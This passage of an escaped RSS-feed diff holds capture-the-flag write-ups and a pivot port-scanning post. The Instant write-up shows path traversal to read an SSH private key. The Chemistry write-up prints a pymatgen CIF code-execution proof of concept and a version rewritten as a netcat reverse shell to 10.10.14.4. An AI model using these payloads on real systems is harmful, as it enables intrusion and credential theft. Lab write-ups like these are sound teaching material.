+&lt;p&gt;We can see in the results different API endpoints in the &lt;code&gt;mywalletv1&lt;/code&gt; subdomain. Let&amp;rsquo;s add it to our hosts file and take look at the api.&lt;/p&gt;
+&lt;p&gt;In the second and third search results, we can see a token being set to the &lt;code&gt;Authorization&lt;/code&gt; header:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/auth_header.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;JWT token&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;If we try to access an endpoint without the token, we get a 401:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;527138946&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;527138946&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Accessing API without the token&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+curl http://mywalletv1.instant.htb/api/v1/view/profile
+
+{&amp;#34;Description&amp;#34;:&amp;#34;Unauthorized!&amp;#34;,&amp;#34;Status&amp;#34;:401}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;After adding the token:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;986523417&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;986523417&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Accessing API with the token&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+curl http://mywalletv1.instant.htb/api/v1/view/profile -H &amp;#34;Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA&amp;#34;
+
+{&amp;#34;Profile&amp;#34;:{&amp;#34;account_status&amp;#34;:&amp;#34;active&amp;#34;,&amp;#34;email&amp;#34;:&amp;#34;admin@instant.htb&amp;#34;,&amp;#34;invite_token&amp;#34;:&amp;#34;instant_admin_inv&amp;#34;,&amp;#34;role&amp;#34;:&amp;#34;Admin&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;instantAdmin&amp;#34;,&amp;#34;wallet_balance&amp;#34;:&amp;#34;10000000&amp;#34;,&amp;#34;wallet_id&amp;#34;:&amp;#34;f0eca6e5-783a-471d-9d8f-0162cbc900db&amp;#34;},&amp;#34;Status&amp;#34;:200}
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;This confirms the validity of the token. Now let&amp;rsquo;s see if there is a documentation for this api.&lt;/p&gt;
+&lt;p&gt;Documentation pages are usually found in endpoints like:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;/api&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/swagger/index.html&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/openapi.json&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Unfortunately, we don&amp;rsquo;t get any results with these. Let&amp;rsquo;s do another search with jadx, but this time adding more elements to our search such as classes, comments, etc:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/jadx_extended_search.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Extended search in jadx&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Now we find have another vhost: &lt;code&gt;swagger-ui.instant.htb&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;swagger-ui&#34;&gt;Swagger UI&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Navigating to this website, we get the access to the documentation of the api:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/swagger-page.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Documentation page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s add our token by clicking on &amp;lsquo;Authorize&amp;rsquo;:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/adding_token.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Adding the JWT token&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;Looking at the different endpoints, we can see one that stands out: &lt;code&gt;/api/v1/admin/read/log&lt;/code&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/read_logs.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Endpoint to read log files&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/possible_lfi.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Parameter needed&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;This could potentially lead to a LFI, allowing us to read local files on the server. Let&amp;rsquo;s first try to send a valid request to see what the response looks like:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/1log.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Sending a valid request&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;foothold---user&#34;&gt;Foothold - User&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Not only did we get the file, but also its full path. We could try to get access to the user&amp;rsquo;s private key by leveraging a path traversal as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;../.ssh/id_rsa
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/idrsa.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Reading private ssh key&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;We got the private key. However, we&amp;rsquo;ll need to clean it up for it to be usable. We can do that with the following command:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;763512948&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;763512948&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Cleaning up key file&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+cat key | sed &amp;#39;s/^    &amp;#34;//&amp;#39; | sed &amp;#39;s/\\n&amp;#34;.*$//&amp;#39; | tee id_rsa
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;We copied the private key inside &lt;code&gt;key&lt;/code&gt; and used &lt;code&gt;sed&lt;/code&gt; to remove anything unnecessary and write the output to &lt;code&gt;id_rsa&lt;/code&gt;. After that we can just change the permissions of the file (&lt;code&gt;chmod 600 id_rsa&lt;/code&gt;) and log in:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/user.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;User flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;root&#34;&gt;Root&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Inside &lt;code&gt;/opt/backups/Solar-PuTTY&lt;/code&gt;, there is a file called &lt;code&gt;sessions-backup.dat&lt;/code&gt;. After a little bit of research, we see that we can use &lt;a href=&#34;https://gist.github.com/xHacka/052e4b09d893398b04bf8aff5872d0d5&#34;&gt;this script&lt;/a&gt; to decrypt the session file:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/rootpass.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root password&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;With this password, we can switch to root&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/instant/root.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Root flag obtained !&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+</content>
+    </item>
+    
+    <item>
+      <title>Port scanning through network pivots</title>
+      <link>//localhost:1313/posts/blogpost-portscanning-through-pivots/</link>
+      <pubDate>Sun, 09 Mar 2025 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/blogpost-portscanning-through-pivots/</guid>
+      <description>&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;If you&amp;rsquo;ve ever tried port scanning a machine in an internal network through a pivot machine, you might have noticed that it can be very slow at times and that the results of the scan aren&amp;rsquo;t always very reliable (missing open ports :/).&lt;/p&gt;
+&lt;p&gt;Once solution that comes to mind might be to transfer nmap (or another port scanner) on the pivot machine and then run the scan from there.&lt;/p&gt;</description>
+      <content>&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;If you&amp;rsquo;ve ever tried port scanning a machine in an internal network through a pivot machine, you might have noticed that it can be very slow at times and that the results of the scan aren&amp;rsquo;t always very reliable (missing open ports :/).&lt;/p&gt;
+&lt;p&gt;Once solution that comes to mind might be to transfer nmap (or another port scanner) on the pivot machine and then run the scan from there.&lt;/p&gt;
+&lt;p&gt;This method, although effective in terms of packet transmission (during the scan, packets will only travel from pivot to target without third-party), it presents some obstacles such as:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Lack of stealth&lt;/strong&gt;: Uploading a binary to the host is quite noisy and can be very easily detected&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Missing services&lt;/strong&gt;: There has been many times where nmap threw errors for some missing services (although still able to do a basic port scan)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Inconvenience&lt;/strong&gt;: Uploading the binary &amp;gt; Login to the host &amp;gt; Running the binary &amp;gt; Copying the results &amp;gt; Pasting them. These are a lot of steps just for a port scan.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/squ4r00t/sps&#34;&gt;sps&lt;/a&gt; is a tool that tries to circumvent these issues. It is a simple TCP port scanner written in Go to which you can specify a host to run the scan from (&lt;strong&gt;filelessly&lt;/strong&gt;).&lt;/p&gt;
+&lt;h3 id=&#34;quick-reminder-on-pivoting&#34;&gt;Quick Reminder on Pivoting&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;Pivoting is a technique used to access internal networks that are not directly reachable by the intermediary of pivots. A pivot host is a machine that is both in our network and the internal network that we want to access:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/general/pscan_through_pivots/pivoting_primer.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Basic Pivoting Scenario&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;In the image above, as the attacker (&lt;code&gt;10.10.50.20&lt;/code&gt;) we cannot directly access Server 1 (&lt;code&gt;172.16.10.3&lt;/code&gt;). However there is a host that we can reach and which can reach Server 1. That host is the Pivot here having the IP addresses: &lt;code&gt;10.10.50.100&lt;/code&gt; &amp;amp; &lt;code&gt;172.16.10.2&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;In this situation, we can pivot into the internal network (&lt;code&gt;172.16.10.0/24&lt;/code&gt;) by tunneling our traffic through the Pivot (also called Jump Host). That way, if we want to send a packet to Server 1, we would send it first to the Pivot, which will then relay it to Server 1.&lt;/p&gt;
+&lt;p&gt;Using tools like &lt;a href=&#34;https://github.com/nicocha30/ligolo-ng&#34;&gt;ligolo-ng&lt;/a&gt; or &lt;a href=&#34;https://github.com/jpillora/chisel&#34;&gt;chisel&lt;/a&gt; we can easily do just that.&lt;/p&gt;
+&lt;h3 id=&#34;port-scanning-through-pivots&#34;&gt;Port Scanning through Pivots&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;When scanning hosts that are in an internal network from an external network, we usually have to make a compromise between speed and accuracy/stability. If we send too many requests, we will probably lose some packets which might result in missing open ports making the scan results unreliable. Furthermore, it can also break the tunnel that we constructed to access the internal network.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/general/pscan_through_pivots/old_way.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Scanning through a pivot (default way)&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;In the above image, we can see 3 hosts:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Attacker&lt;/strong&gt; which is in an external network trying to port scan a server that is situated in the internal network&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Pivot&lt;/strong&gt; relaying the packets from &lt;strong&gt;Attacker&lt;/strong&gt; to the target server&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Server to scan&lt;/strong&gt; which is the target server being scanned&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can also see &lt;strong&gt;dashed arrows&lt;/strong&gt; reprensenting the flow of packets being transfered in the different network segments.&lt;/p&gt;
+&lt;p&gt;In this scenario, let&amp;rsquo;s say we are probing port 80. Before we get back info whether the port is opened or closed, the information would have went through 4 segments (2 for request, 2 for response). And that&amp;rsquo;s if we&amp;rsquo;re doing a SYN scan. In this case we can see that it&amp;rsquo;s not unlikely that one of the packets might be lost, especially when our connection is not very stable (typical when pivoting).&lt;/p&gt;
+&lt;p&gt;To avoid all these problems we can, like mentionned in the introduction, perform the scan from the pivot machine. But without having to write on disk (for the sake of stealth).&lt;/p&gt;
+&lt;h3 id=&#34;sps-simpleportscanner&#34;&gt;SPS (SimplePortScanner)&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/squ4r00t/sps&#34;&gt;sps&lt;/a&gt; is a TCP port scanner written in Go to which you can specify a host (which you have ssh access to) to run the scan from (&lt;strong&gt;filelessly&lt;/strong&gt;).&lt;/p&gt;
+&lt;p&gt;It will connect to the specified host with the credentials provided. Upon successful authentication, it executes a command that will retrieve the compiled binary of sps hosted on a HTTP server or SMB share that you&amp;rsquo;ve set up before running sps.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The command that is executed, as well as whether a HTTP server or SMB share should be setup, both depends on the OS of the host perfoming the scan. This is explained in &lt;a href=&#34;https://github.com/squ4r00t/sps&#34;&gt;sps&amp;rsquo; README&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;Once the binary is retrieved it will be executed in memory and the results will be returned on STDOUT.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/general/pscan_through_pivots/tn.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Port scanning through pivot using sps&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;On the above image, we can see that the arrows between the attacker and the pivot are not dashed anymore. This illustrates that we are not sending each single packet (for a single probe) all the way from attacker to target, rather we will send one &amp;ldquo;big request&amp;rdquo; to the pivot, which will do the work and returns us back the results.&lt;/p&gt;
+&lt;p&gt;On the perspective of the attacker, it&amp;rsquo;s like the scan was ran from their machine.&lt;/p&gt;
+&lt;p&gt;Thanks for reading, you can check out the tool here
+-&amp;gt; &lt;a href=&#34;https://github.com/squ4r00t/sps&#34;&gt;SPS&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HTB - Chemistry</title>
+      <link>//localhost:1313/posts/htb-chemistry/</link>
+      <pubDate>Mon, 03 Mar 2025 00:00:00 +0000</pubDate>
+      
+      <guid>//localhost:1313/posts/htb-chemistry/</guid>
+      <description>&lt;p&gt;Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the &lt;code&gt;pymatgen&lt;/code&gt; (CVE-2024-23346) Python library by uploading a malicious &lt;code&gt;CIF&lt;/code&gt; file to the hosted &lt;code&gt;CIF Analyzer&lt;/code&gt; website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as &lt;code&gt;rosa&lt;/code&gt; user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called &lt;code&gt;AioHTTP&lt;/code&gt; (CVE-2024-23334) which is used on the web application running internally to read the root flag.&lt;/p&gt;</description>
+      <content>&lt;p&gt;Chemistry is an easy-difficulty Linux machine that showcases a Remote Code Execution (RCE) vulnerability in the &lt;code&gt;pymatgen&lt;/code&gt; (CVE-2024-23346) Python library by uploading a malicious &lt;code&gt;CIF&lt;/code&gt; file to the hosted &lt;code&gt;CIF Analyzer&lt;/code&gt; website on the target. After discovering and cracking hashes, we authenticate to the target via SSH as &lt;code&gt;rosa&lt;/code&gt; user. For privilege escalation, we exploit a Path Traversal vulnerability that leads to an Arbitrary File Read in a Python library called &lt;code&gt;AioHTTP&lt;/code&gt; (CVE-2024-23334) which is used on the web application running internally to read the root flag.&lt;/p&gt;
+&lt;h2 id=&#34;port-scanning&#34;&gt;Port Scanning&lt;/h2&gt;
+&lt;hr&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE REASON  VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5000/tcp open  upnp?   syn-ack
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We got 2 ports open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;22 running ssh&lt;/li&gt;
+&lt;li&gt;5000 running a web server&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;website&#34;&gt;Website&lt;/h2&gt;
+&lt;hr&gt;
+&lt;p&gt;Navigating to &lt;code&gt;http://10.10.11.38:5000&lt;/code&gt;, we get the following page:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/home_page.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Home Page&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;The content of the home page already gives us a hint:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.&lt;/p&gt;&lt;/blockquote&gt;
+&lt;p&gt;We also have the possibility to log in or to create an account.&lt;/p&gt;
+&lt;h3 id=&#34;login-page&#34;&gt;Login Page&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;On the login page, I tried submitting some defaults credentials and quickly tested for basic sqli but without success:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/login_page_invalid_creds.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Invalid credentials&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;h3 id=&#34;creating-an-account&#34;&gt;Creating an account&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;We can try to register an account at &lt;code&gt;/register&lt;/code&gt;&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/create_account.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Registering an account&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After registering an account we get access to the following dashboard:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/dashboard.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Dashboard&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;The website allows us to upload a CIF file. It also provides us with an example at &lt;code&gt;/static/example.cif&lt;/code&gt;:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;279635148&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;279635148&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;cif&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;/static/example.cif&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-cif&#34; &gt;&lt;code&gt;
+data_Example
+_cell_length_a    10.00000
+_cell_length_b    10.00000
+_cell_length_c    10.00000
+_cell_angle_alpha 90.00000
+_cell_angle_beta  90.00000
+_cell_angle_gamma 90.00000
+_symmetry_space_group_name_H-M &amp;#39;P 1&amp;#39;
+loop_
+ _atom_site_label
+ _atom_site_fract_x
+ _atom_site_fract_y
+ _atom_site_fract_z
+ _atom_site_occupancy
+ H 0.00000 0.00000 0.00000 1
+ O 0.50000 0.50000 0.50000 1
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;h3 id=&#34;exploit-for-cif-files&#34;&gt;Exploit for CIF files&lt;/h3&gt;
+&lt;hr&gt;
+&lt;p&gt;A searching for exploits involving CIF files, we find &lt;a href=&#34;https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f&#34;&gt;this security report&lt;/a&gt; showing how we can get RCE with a malicious CIF file using this POC:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;237169845&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;237169845&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;bash&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;POC cif file&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-bash&#34; &gt;&lt;code&gt;
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          &amp;#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&amp;#34;
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  &amp;#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]&amp;#43;[&amp;#34;__sub&amp;#34; &amp;#43; &amp;#34;classes__&amp;#34;]) () if d.__name__ == &amp;#34;BuiltinImporter&amp;#34;][0].load_module (&amp;#34;os&amp;#34;).system (&amp;#34;touch pwned&amp;#34;);0,0,0&amp;#39;
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  &amp;#34;P  n&amp;#39;  m  a&amp;#39;  &amp;#34;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Let&amp;rsquo;s replace the command with a reverse shell:&lt;/p&gt;
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;316824795&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;316824795&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;cif&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;Reverse shell cif file&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;△&#34; data-label-collapse=&#34;▽&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-cif&#34; &gt;&lt;code&gt;
+data_5yOhtAoR
+_audit_creation_date            2018-06-08
+_audit_creation_method          &amp;#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&amp;#34;
+
+loop_
+_parent_propagation_vector.id
+_parent_propagation_vector.kxkykz
+k1 [0 0 0]
+
+_space_group_magn.transform_BNS_Pp_abc  &amp;#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]&amp;#43;[&amp;#34;__sub&amp;#34; &amp;#43; &amp;#34;classes__&amp;#34;]) () if d.__name__ == &amp;#34;BuiltinImporter&amp;#34;][0].load_module (&amp;#34;os&amp;#34;).system (&amp;#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&amp;gt;&amp;amp;1|nc 10.10.14.4 1337 &amp;gt;/tmp/f&amp;#34;);0,0,0&amp;#39;
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  &amp;#34;P  n&amp;#39;  m  a&amp;#39;  &amp;#34;
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+&lt;p&gt;Now let&amp;rsquo;s upload it:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/upload_cif.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Uploading malicious CIF file&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;After clicking on upload, we see that we can view it or delete it:&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/after_upload.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;File uploaded&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;If we click on view, we get a 500 Internal server error, and we don&amp;rsquo;t get a reverse shell.&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/500_err.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;500 Internal server error&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;However if we replace the command with just &lt;code&gt;nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt;&lt;/code&gt;, we get a connection.&lt;/p&gt;
+&lt;p&gt;In this case, we can upload the reverse shell, and then execute it&lt;/p&gt;
+
+  &lt;figure class=&#34;center&#34; &gt;
+    &lt;img src=&#34;//localhost:1313/img/htb/chemistry/hosting_revshell.png&#34;   /&gt;
+    
+      &lt;figcaption class=&#34;center&#34; &gt;Hosting reverse shell with python http server&lt;/figcaption&gt;
+    
+  &lt;/figure&gt;
+
+
+&lt;p&gt;The file &lt;code&gt;shell.sh&lt;/code&gt; contains the following:&lt;/p&gt;
